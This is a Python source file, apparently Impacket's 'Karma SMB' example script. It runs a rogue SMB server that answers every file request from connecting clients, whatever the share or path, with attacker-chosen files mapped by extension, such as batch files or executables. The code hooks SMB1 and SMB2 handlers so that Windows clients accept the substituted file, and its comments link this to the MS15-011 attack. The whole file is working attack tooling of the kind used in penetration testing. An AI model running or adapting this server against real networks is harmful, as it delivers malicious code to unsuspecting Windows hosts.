#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   Karma SMB
#
#   The idea of this script is to answer any file read request
#   with a set of predefined contents based on the extension
#   asked, regardless of the sharename and/or path.
#   When executing this script w/o a config file the pathname
#   file contents will be sent for every request.
#   If a config file is specified, format should be this way:
#      <extension> = <pathname>
#   for example:
#      bat = /tmp/batchfile
#      com = /tmp/comfile
#      exe = /tmp/exefile
#
#   The SMB2 support works with a caveat. If two different
#   filenames at the same share are requested, the first
#   one will work and the second one will not work if the request
#   is performed right away. This seems related to the
#   QUERY_DIRECTORY request, where we return the files available.
#   In the first try, we return the file that was asked to open.
#   In the second try, the client will NOT ask for another
#   QUERY_DIRECTORY but will use the cached one. This time the new file
#   is not there, so the client assumes it doesn't exist.
#   After a few seconds, looks like the client cache is cleared and
#   the operation works again. Further research is needed trying
#   to avoid this from happening.
#
#   SMB1 seems to be working fine on that scenario.
#
# Author:
#   Alberto Solino (@agsolino)
#   Original idea by @mubix
#
# ToDo:
#   [ ] A lot of testing needed under different OSes.
#       I'm still not sure how reliable this approach is.
#   [ ] Add support for other SMB read commands. Right now just
#       covering SMB_COM_NT_CREATE_ANDX
#   [ ] Disable write request, now if the client tries to copy
#       a file back to us, it will overwrite the files we're
#       hosting. *CAREFUL!!!*
#

from __future__ import division
from __future__ import print_function
import sys
import os
import argparse
import logging
import ntpath
try:
    import ConfigParser
except ImportError:
    import configparser as ConfigParser
from threading import Thread

from impacket.examples import logger
from impacket import smbserver, smb, version
import impacket.smb3structs as smb2
from impacket.smb import FILE_OVERWRITE, FILE_OVERWRITE_IF, FILE_WRITE_DATA, FILE_APPEND_DATA, GENERIC_WRITE
from impacket.nt_errors import STATUS_USER_SESSION_DELETED, STATUS_SUCCESS, STATUS_ACCESS_DENIED, STATUS_NO_MORE_FILES, \
    STATUS_OBJECT_PATH_NOT_FOUND
from impacket.smbserver import SRVSServer, decodeSMBString, findFirst2, STATUS_SMB_BAD_TID, encodeSMBString, \
    getFileTime, queryPathInformation


class KarmaSMBServer(Thread):
    def __init__(self, smb2Support = False):
        Thread.__init__(self)
        self.server = 0
        self.defaultFile = None
        self.extensions = {}

        # Here we write a mini config for the server
        smbConfig = ConfigParser.ConfigParser()
        smbConfig.add_section('global')
        smbConfig.set('global','server_name','server_name')
        smbConfig.set('global','server_os','UNIX')
        smbConfig.set('global','server_domain','WORKGROUP')
        smbConfig.set('global','log_file','smb.log')
        smbConfig.set('global','credentials_file','')

        # IPC always needed
        smbConfig.add_section('IPC$')
        smbConfig.set('IPC$','comment','Logon server share')
        smbConfig.set('IPC$','read only','yes')
        smbConfig.set('IPC$','share type','3')
        smbConfig.set('IPC$','path','')

        # NETLOGON always needed
        smbConfig.add_section('NETLOGON')
        smbConfig.set('NETLOGON','comment','Logon server share')
        smbConfig.set('NETLOGON','read only','no')
        smbConfig.set('NETLOGON','share type','0')
        smbConfig.set('NETLOGON','path','')

        # SYSVOL always needed
        smbConfig.add_section('SYSVOL')
        smbConfig.set('SYSVOL','comment','')
        smbConfig.set('SYSVOL','read only','no')
        smbConfig.set('SYSVOL','share type','0')
        smbConfig.set('SYSVOL','path','')

        if smb2Support:
            smbConfig.set("global", "SMB2Support", "True")

        self.server = smbserver.SMBSERVER(('0.0.0.0',445), config_parser = smbConfig)
        self.server.processConfigFile()

        # Unregistering some dangerous and unwanted commands
        self.server.unregisterSmbCommand(smb.SMB.SMB_COM_CREATE_DIRECTORY)
        self.server.unregisterSmbCommand(smb.SMB.SMB_COM_DELETE_DIRECTORY)
        self.server.unregisterSmbCommand(smb.SMB.SMB_COM_RENAME)
        self.server.unregisterSmbCommand(smb.SMB.SMB_COM_DELETE)
        self.server.unregisterSmbCommand(smb.SMB.SMB_COM_WRITE)
        self.server.unregisterSmbCommand(smb.SMB.SMB_COM_WRITE_ANDX)

        self.server.unregisterSmb2Command(smb2.SMB2_WRITE)

        self.origsmbComNtCreateAndX = self.server.hookSmbCommand(smb.SMB.SMB_COM_NT_CREATE_ANDX, self.smbComNtCreateAndX)
        self.origsmbComTreeConnectAndX = self.server.hookSmbCommand(smb.SMB.SMB_COM_TREE_CONNECT_ANDX, self.smbComTreeConnectAndX)
        self.origQueryPathInformation = self.server.hookTransaction2(smb.SMB.TRANS2_QUERY_PATH_INFORMATION, self.queryPathInformation)
        self.origFindFirst2 = self.server.hookTransaction2(smb.SMB.TRANS2_FIND_FIRST2, self.findFirst2)

        # And the same for SMB2
        self.origsmb2TreeConnect = self.server.hookSmb2Command(smb2.SMB2_TREE_CONNECT, self.smb2TreeConnect)
        self.origsmb2Create = self.server.hookSmb2Command(smb2.SMB2_CREATE, self.smb2Create)
        self.origsmb2QueryDirectory = self.server.hookSmb2Command(smb2.SMB2_QUERY_DIRECTORY, self.smb2QueryDirectory)
        self.origsmb2Read = self.server.hookSmb2Command(smb2.SMB2_READ, self.smb2Read)
        self.origsmb2Close = self.server.hookSmb2Command(smb2.SMB2_CLOSE, self.smb2Close)

        # Now we have to register the MS-SRVS server. This specially important for 
        # Windows 7+ and Mavericks clients since they WON'T (specially OSX) 
        # ask for shares using MS-RAP.

        self.__srvsServer = SRVSServer()
        self.__srvsServer.daemon = True
        self.server.registerNamedPipe('srvsvc',('127.0.0.1',self.__srvsServer.getListenPort()))

    def findFirst2(self, connId, smbServer, recvPacket, parameters, data, maxDataCount):
        connData = smbServer.getConnectionData(connId)

        respSetup = b''
        respParameters = b''
        respData = b''
        findFirst2Parameters = smb.SMBFindFirst2_Parameters( recvPacket['Flags2'], data = parameters)

        # 1. Let's grab the extension and map the file's contents we will deliver
        origPathName = os.path.normpath(decodeSMBString(recvPacket['Flags2'],findFirst2Parameters['FileName']).replace('\\','/'))
        origFileName = os.path.basename(origPathName)

        _, origPathNameExtension = os.path.splitext(origPathName)
        origPathNameExtension = origPathNameExtension.upper()[1:]

        if origPathNameExtension.upper() in self.extensions:
            targetFile = self.extensions[origPathNameExtension.upper()]
        else:
            targetFile = self.defaultFile

        if recvPacket['Tid'] in connData['ConnectedShares']:
            path = connData['ConnectedShares'][recvPacket['Tid']]['path']

            # 2. We call the normal findFirst2 call, but with our targetFile
            searchResult, searchCount, errorCode = findFirst2(path, 
                          targetFile, 
                          findFirst2Parameters['InformationLevel'], 
                          findFirst2Parameters['SearchAttributes'], pktFlags = recvPacket['Flags2'] )

            respParameters = smb.SMBFindFirst2Response_Parameters()
            endOfSearch = 1
            sid = 0x80 # default SID
            searchCount = 0
            totalData = 0
            for i in enumerate(searchResult):
                #i[1].dump()
                try:
                    # 3. And we restore the original filename requested ;)
                    i[1]['FileName'] = encodeSMBString( flags = recvPacket['Flags2'], text = origFileName)
                except:
                    pass

                data = i[1].getData()
                lenData = len(data)
                if (totalData+lenData) >= maxDataCount or (i[0]+1) > findFirst2Parameters['SearchCount']:
                    # We gotta stop here and continue on a find_next2
                    endOfSearch = 0
                    # Simple way to generate a fid
                    if len(connData['SIDs']) == 0:
                       sid = 1
                    else:
                       sid = list(connData['SIDs'].keys())[-1] + 1
                    # Store the remaining search results in the ConnData SID
                    connData['SIDs'][sid] = searchResult[i[0]:]
                    respParameters['LastNameOffset'] = totalData
                    break
                else:
                    searchCount +=1
                    respData += data
                    totalData += lenData
                    

            respParameters['SID'] = sid
            respParameters['EndOfSearch'] = endOfSearch
            respParameters['SearchCount'] = searchCount
        else:
            errorCode = STATUS_SMB_BAD_TID   

        smbServer.setConnectionData(connId, connData)

        return respSetup, respParameters, respData, errorCode

    def smbComNtCreateAndX(self, connId, smbServer, SMBCommand, recvPacket):
        connData = smbServer.getConnectionData(connId)

        ntCreateAndXParameters = smb.SMBNtCreateAndX_Parameters(SMBCommand['Parameters'])
        ntCreateAndXData       = smb.SMBNtCreateAndX_Data( flags = recvPacket['Flags2'], data = SMBCommand['Data'])

        respSMBCommand        = smb.SMBCommand(smb.SMB.SMB_COM_NT_CREATE_ANDX)

        #ntCreateAndXParameters.dump()

        # Let's try to avoid allowing write requests from the client back to us
        # not 100% bulletproof, plus also the client might be using other SMB
        # calls (e.g. SMB_COM_WRITE)
        createOptions =  ntCreateAndXParameters['CreateOptions']
        if createOptions & smb.FILE_DELETE_ON_CLOSE == smb.FILE_DELETE_ON_CLOSE:
            errorCode = STATUS_ACCESS_DENIED
        elif ntCreateAndXParameters['Disposition'] & smb.FILE_OVERWRITE == FILE_OVERWRITE:
            errorCode = STATUS_ACCESS_DENIED
        elif ntCreateAndXParameters['Disposition'] & smb.FILE_OVERWRITE_IF == FILE_OVERWRITE_IF:
            errorCode = STATUS_ACCESS_DENIED
        elif ntCreateAndXParameters['AccessMask'] & smb.FILE_WRITE_DATA == FILE_WRITE_DATA:
            errorCode = STATUS_ACCESS_DENIED
        elif ntCreateAndXParameters['AccessMask'] & smb.FILE_APPEND_DATA == FILE_APPEND_DATA:
            errorCode = STATUS_ACCESS_DENIED
        elif ntCreateAndXParameters['AccessMask'] & smb.GENERIC_WRITE == GENERIC_WRITE:
            errorCode = STATUS_ACCESS_DENIED
        elif ntCreateAndXParameters['AccessMask'] & 0x10000 == 0x10000:
            errorCode = STATUS_ACCESS_DENIED
        else:
            errorCode = STATUS_SUCCESS

        if errorCode == STATUS_ACCESS_DENIED:
            return [respSMBCommand], None, errorCode

        # 1. Let's grab the extension and map the file's contents we will deliver
        origPathName = os.path.normpath(decodeSMBString(recvPacket['Flags2'],ntCreateAndXData['FileName']).replace('\\','/'))

        _, origPathNameExtension = os.path.splitext(origPathName)
        origPathNameExtension = origPathNameExtension.upper()[1:]

        if origPathNameExtension.upper() in self.extensions:
            targetFile = self.extensions[origPathNameExtension.upper()]
        else:
            targetFile = self.defaultFile
        
        # 2. We change the filename in the request for our targetFile
        ntCreateAndXData['FileName'] = encodeSMBString( flags = recvPacket['Flags2'], text = targetFile)
        SMBCommand['Data'] = ntCreateAndXData.getData()
        smbServer.log("%s is asking for %s. Delivering %s" % (connData['ClientIP'], origPathName,targetFile),logging.INFO)

        # 3. We call the original call with our modified data
        return self.origsmbComNtCreateAndX(connId, smbServer, SMBCommand, recvPacket)

    def queryPathInformation(self, connId, smbServer, recvPacket, parameters, data, maxDataCount = 0):
        # The trick we play here is that Windows clients first ask for the file
        # and then it asks for the directory containing the file.
        # It is important to answer the right questions for the attack to work
        
        connData = smbServer.getConnectionData(connId)

        respSetup = b''
        respParameters = b''
        respData = b''
        errorCode = 0

        queryPathInfoParameters = smb.SMBQueryPathInformation_Parameters(flags = recvPacket['Flags2'], data = parameters)

        if recvPacket['Tid'] in connData['ConnectedShares']:
            path = ''
            try:
               origPathName = decodeSMBString(recvPacket['Flags2'], queryPathInfoParameters['FileName'])
               origPathName = os.path.normpath(origPathName.replace('\\','/'))

               if ('MS15011' in connData) is False:
                   connData['MS15011'] = {}

               smbServer.log("Client is asking for QueryPathInformation for: %s" % origPathName,logging.INFO)
               if origPathName in connData['MS15011'] or origPathName == '.':
                   # We already processed this entry, now it's asking for a directory
                   infoRecord, errorCode = queryPathInformation(path, '/', queryPathInfoParameters['InformationLevel'])
               else:
                   # First time asked, asking for the file
                   infoRecord, errorCode = queryPathInformation(path, self.defaultFile, queryPathInfoParameters['InformationLevel'])
                   connData['MS15011'][os.path.dirname(origPathName)] = infoRecord
            except Exception as e:
               #import traceback
               #traceback.print_exc()
               smbServer.log("queryPathInformation: %s" % e,logging.ERROR)

            if infoRecord is not None:
                respParameters = smb.SMBQueryPathInformationResponse_Parameters()
                respData = infoRecord
        else:
            errorCode = STATUS_SMB_BAD_TID
           
        smbServer.setConnectionData(connId, connData)

        return respSetup, respParameters, respData, errorCode

    def smb2Read(self, connId, smbServer, recvPacket):
        connData = smbServer.getConnectionData(connId)
        connData['MS15011']['StopConnection'] = True
        smbServer.setConnectionData(connId, connData)
        return self.origsmb2Read(connId, smbServer, recvPacket)
 
    def smb2Close(self, connId, smbServer, recvPacket):
        connData = smbServer.getConnectionData(connId)
        # We're closing the connection trying to flush the client's
        # cache.
        if connData['MS15011']['StopConnection'] is True:
            return [smb2.SMB2Error()], None, STATUS_USER_SESSION_DELETED
        return self.origsmb2Close(connId, smbServer, recvPacket)

    def smb2Create(self, connId, smbServer, recvPacket):
        connData = smbServer.getConnectionData(connId)

        ntCreateRequest       = smb2.SMB2Create(recvPacket['Data'])

        # Let's try to avoid allowing write requests from the client back to us
        # not 100% bulletproof, plus also the client might be using other SMB
        # calls 
        createOptions =  ntCreateRequest['CreateOptions']
        if createOptions & smb2.FILE_DELETE_ON_CLOSE == smb2.FILE_DELETE_ON_CLOSE:
            errorCode = STATUS_ACCESS_DENIED
        elif ntCreateRequest['CreateDisposition'] & smb2.FILE_OVERWRITE == smb2.FILE_OVERWRITE:
            errorCode = STATUS_ACCESS_DENIED
        elif ntCreateRequest['CreateDisposition'] & smb2.FILE_OVERWRITE_IF == smb2.FILE_OVERWRITE_IF:
            errorCode = STATUS_ACCESS_DENIED
        elif ntCreateRequest['DesiredAccess'] & smb2.FILE_WRITE_DATA == smb2.FILE_WRITE_DATA:
            errorCode = STATUS_ACCESS_DENIED
        elif ntCreateRequest['DesiredAccess'] & smb2.FILE_APPEND_DATA == smb2.FILE_APPEND_DATA:
            errorCode = STATUS_ACCESS_DENIED
        elif ntCreateRequest['DesiredAccess'] & smb2.GENERIC_WRITE == smb2.GENERIC_WRITE:
            errorCode = STATUS_ACCESS_DENIED
        elif ntCreateRequest['DesiredAccess'] & 0x10000 == 0x10000:
            errorCode = STATUS_ACCESS_DENIED
        else:
            errorCode = STATUS_SUCCESS

        if errorCode == STATUS_ACCESS_DENIED:
            return [smb2.SMB2Error()], None, errorCode

        # 1. Let's grab the extension and map the file's contents we will deliver
        origPathName = os.path.normpath(ntCreateRequest['Buffer'][:ntCreateRequest['NameLength']].decode('utf-16le').replace('\\','/'))

        _, origPathNameExtension = os.path.splitext(origPathName)
        origPathNameExtension = origPathNameExtension.upper()[1:]

        # Are we being asked for a directory?
        if (createOptions & smb2.FILE_DIRECTORY_FILE) == 0:
            if origPathNameExtension.upper() in self.extensions:
                targetFile = self.extensions[origPathNameExtension.upper()]
            else:
                targetFile = self.defaultFile
            connData['MS15011']['FileData'] = (os.path.basename(origPathName), targetFile)
            smbServer.log("%s is asking for %s. Delivering %s" % (connData['ClientIP'], origPathName,targetFile),logging.INFO)
        else:
            targetFile = '/'
        
        # 2. We change the filename in the request for our targetFile
        try:
            ntCreateRequest['Buffer'] = targetFile.encode('utf-16le')
        except UnicodeDecodeError:
            import sys
            ntCreateRequest['Buffer'] = targetFile.decode(sys.getfilesystemencoding()).encode('utf-16le')
        ntCreateRequest['NameLength'] = len(targetFile)*2
        recvPacket['Data'] = ntCreateRequest.getData()

        # 3. We call the original call with our modified data
        return self.origsmb2Create(connId, smbServer, recvPacket)

    def smb2QueryDirectory(self, connId, smbServer, recvPacket):
        # Windows clients with SMB2 will also perform a QueryDirectory
        # expecting to get the filename asked. So we deliver it :)
        connData = smbServer.getConnectionData(connId)

        respSMBCommand = smb2.SMB2QueryDirectory_Response()
        #queryDirectoryRequest   = smb2.SMB2QueryDirectory(recvPacket['Data'])

        errorCode = 0xff
        respSMBCommand['Buffer'] = b'\x00'

        errorCode = STATUS_SUCCESS

        #if (queryDirectoryRequest['Flags'] & smb2.SL_RETURN_SINGLE_ENTRY) == 0:
        #    return [smb2.SMB2Error()], None, STATUS_NOT_SUPPORTED

        if connData['MS15011']['FindDone'] is True:
            
            connData['MS15011']['FindDone'] = False
            smbServer.setConnectionData(connId, connData)
            return [smb2.SMB2Error()], None, STATUS_NO_MORE_FILES 
        else:
            origName, targetFile =  connData['MS15011']['FileData']
            (mode, ino, dev, nlink, uid, gid, size, atime, mtime, ctime) = os.stat(targetFile)

            infoRecord = smb.SMBFindFileIdBothDirectoryInfo( smb.SMB.FLAGS2_UNICODE )
            infoRecord['ExtFileAttributes'] = smb.ATTR_NORMAL | smb.ATTR_ARCHIVE

            infoRecord['EaSize']            = 0
            infoRecord['EndOfFile']         = size
            infoRecord['AllocationSize']    = size
            infoRecord['CreationTime']      = getFileTime(ctime)
            infoRecord['LastAccessTime']    = getFileTime(atime)
            infoRecord['LastWriteTime']     = getFileTime(mtime)
            infoRecord['LastChangeTime']    = getFileTime(mtime)
            infoRecord['ShortName']         = b'\x00'*24
            #infoRecord['FileName']          = os.path.basename(origName).encode('utf-16le')
            infoRecord['FileName']          = origName.encode('utf-16le')
            padLen = (8-(len(infoRecord) % 8)) % 8
            infoRecord['NextEntryOffset']   = 0

            respSMBCommand['OutputBufferOffset'] = 0x48
            respSMBCommand['OutputBufferLength'] = len(infoRecord.getData())
            respSMBCommand['Buffer'] = infoRecord.getData() + b'\xaa'*padLen
            connData['MS15011']['FindDone'] = True

        smbServer.setConnectionData(connId, connData)
        return [respSMBCommand], None, errorCode

    def smb2TreeConnect(self, connId, smbServer, recvPacket):
        connData = smbServer.getConnectionData(connId)

        respPacket = smb2.SMB2Packet()
        respPacket['Flags']     = smb2.SMB2_FLAGS_SERVER_TO_REDIR
        respPacket['Status']    = STATUS_SUCCESS
        respPacket['CreditRequestResponse'] = 1
        respPacket['Command']   = recvPacket['Command']
        respPacket['SessionID'] = connData['Uid']
        respPacket['Reserved']  = recvPacket['Reserved']
        respPacket['MessageID'] = recvPacket['MessageID']
        respPacket['TreeID']    = recvPacket['TreeID']

        respSMBCommand        = smb2.SMB2TreeConnect_Response()

        treeConnectRequest = smb2.SMB2TreeConnect(recvPacket['Data'])

        errorCode = STATUS_SUCCESS

        ## Process here the request, does the share exist?
        path = recvPacket.getData()[treeConnectRequest['PathOffset']:][:treeConnectRequest['PathLength']]
        UNCOrShare = path.decode('utf-16le')

        # Is this a UNC?
        if ntpath.ismount(UNCOrShare):
            path = UNCOrShare.split('\\')[3]
        else:
            path = ntpath.basename(UNCOrShare)

        # We won't search for the share.. all of them exist :P
        #share = searchShare(connId, path.upper(), smbServer) 
        connData['MS15011'] = {}
        connData['MS15011']['FindDone'] = False
        connData['MS15011']['StopConnection'] = False
        share = {}
        if share is not None:
            # Simple way to generate a Tid
            if len(connData['ConnectedShares']) == 0:
               tid = 1
            else:
               tid = list(connData['ConnectedShares'].keys())[-1] + 1
            connData['ConnectedShares'][tid] = share
            connData['ConnectedShares'][tid]['path'] = '/'
            connData['ConnectedShares'][tid]['shareName'] = path
            respPacket['TreeID']    = tid
            #smbServer.log("Connecting Share(%d:%s)" % (tid,path))
        else:
            smbServer.log("SMB2_TREE_CONNECT not found %s" % path, logging.ERROR)
            errorCode = STATUS_OBJECT_PATH_NOT_FOUND
            respPacket['Status'] = errorCode
        ##

        if path == 'IPC$':
            respSMBCommand['ShareType'] = smb2.SMB2_SHARE_TYPE_PIPE
            respSMBCommand['ShareFlags'] = 0x30
        else:
            respSMBCommand['ShareType'] = smb2.SMB2_SHARE_TYPE_DISK
            respSMBCommand['ShareFlags'] = 0x0

        respSMBCommand['Capabilities'] = 0
        respSMBCommand['MaximalAccess'] = 0x011f01ff

        respPacket['Data'] = respSMBCommand

        smbServer.setConnectionData(connId, connData)

        return None, [respPacket], errorCode

    def smbComTreeConnectAndX(self, connId, smbServer, SMBCommand, recvPacket):
        connData = smbServer.getConnectionData(connId)

        resp = smb.NewSMBPacket()
        resp['Flags1'] = smb.SMB.FLAGS1_REPLY
        resp['Flags2'] = smb.SMB.FLAGS2_EXTENDED_SECURITY | smb.SMB.FLAGS2_NT_STATUS | smb.SMB.FLAGS2_LONG_NAMES | \
                         recvPacket['Flags2'] & smb.SMB.FLAGS2_UNICODE

        resp['Tid'] = recvPacket['Tid']
        resp['Mid'] = recvPacket['Mid']
        resp['Pid'] = connData['Pid']

        respSMBCommand        = smb.SMBCommand(smb.SMB.SMB_COM_TREE_CONNECT_ANDX)
        respParameters        = smb.SMBTreeConnectAndXResponse_Parameters()
        respData              = smb.SMBTreeConnectAndXResponse_Data()

        treeConnectAndXParameters = smb.SMBTreeConnectAndX_Parameters(SMBCommand['Parameters'])

        if treeConnectAndXParameters['Flags'] & 0x8:
            respParameters        = smb.SMBTreeConnectAndXExtendedResponse_Parameters()

        treeConnectAndXData                    = smb.SMBTreeConnectAndX_Data( flags = recvPacket['Flags2'] )
        treeConnectAndXData['_PasswordLength'] = treeConnectAndXParameters['PasswordLength']
        treeConnectAndXData.fromString(SMBCommand['Data'])

        errorCode = STATUS_SUCCESS

        UNCOrShare = decodeSMBString(recvPacket['Flags2'], treeConnectAndXData['Path'])

        # Is this a UNC?
        if ntpath.ismount(UNCOrShare):
            path = UNCOrShare.split('\\')[3]
        else:
            path = ntpath.basename(UNCOrShare)

        # We won't search for the share.. all of them exist :P
        smbServer.log("TreeConnectAndX request for %s" % path, logging.INFO)
        #share = searchShare(connId, path, smbServer) 
        share = {}
        # Simple way to generate a Tid
        if len(connData['ConnectedShares']) == 0:
           tid = 1
        else:
           tid = list(connData['ConnectedShares'].keys())[-1] + 1
        connData['ConnectedShares'][tid] = share
        connData['ConnectedShares'][tid]['path'] = '/'
        connData['ConnectedShares'][tid]['shareName'] = path
        resp['Tid'] = tid
        #smbServer.log("Connecting Share(%d:%s)" % (tid,path))

        respParameters['OptionalSupport'] = smb.SMB.SMB_SUPPORT_SEARCH_BITS

        if path == 'IPC$':
            respData['Service']               = 'IPC'
        else:
            respData['Service']               = path
        respData['PadLen']                = 0
        respData['NativeFileSystem']      = encodeSMBString(recvPacket['Flags2'], 'NTFS' ).decode()

        respSMBCommand['Parameters']             = respParameters
        respSMBCommand['Data']                   = respData 

        resp['Uid'] = connData['Uid']
        resp.addCommand(respSMBCommand)
        smbServer.setConnectionData(connId, connData)

        return None, [resp], errorCode

    def _start(self):
        self.server.serve_forever()

    def run(self):
        logging.info("Setting up SMB Server")
        self._start()

    def setDefaultFile(self, filename):
        self.defaultFile = filename

    def setExtensionsConfig(self, filename):
        for line in filename.readlines():
            line = line.strip('\r\n ')
            if line.startswith('#') is not True and len(line) > 0:
                extension, pathName = line.split('=')
                self.extensions[extension.strip().upper()] = os.path.normpath(pathName.strip())

# Process command-line arguments.
if __name__ == '__main__':
    # Init the example's logger theme
    logger.init()
    print(version.BANNER)
    parser = argparse.ArgumentParser(add_help = False, description = "For every file request received, this module will "
                                                                     "return the pathname contents")
    parser.add_argument("--help", action="help", help='show this help message and exit')
    parser.add_argument('fileName', action='store', metavar = 'pathname', help="Pathname's contents to deliver to SMB "
                                                                               "clients")
    parser.add_argument('-config', type=argparse.FileType('r'), metavar = 'pathname', help='config file name to map '
                        'extensions to files to deliver. For those extensions not present, pathname will be delivered')
    parser.add_argument('-smb2support', action='store_true', default=False, help='SMB2 Support (experimental!)')


    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    try:
       options = parser.parse_args()
    except Exception as e:
       logging.critical(str(e))
       sys.exit(1)

    s = KarmaSMBServer(options.smb2support)
    s.setDefaultFile(os.path.normpath(options.fileName))
    if options.config is not None:
        s.setExtensionsConfig(options.config)

    s.start()
        
    logging.info("Servers started, waiting for connections")
    while True:
        try:
            sys.stdin.read()
        except KeyboardInterrupt:
            sys.exit(1)
        else:
            pass
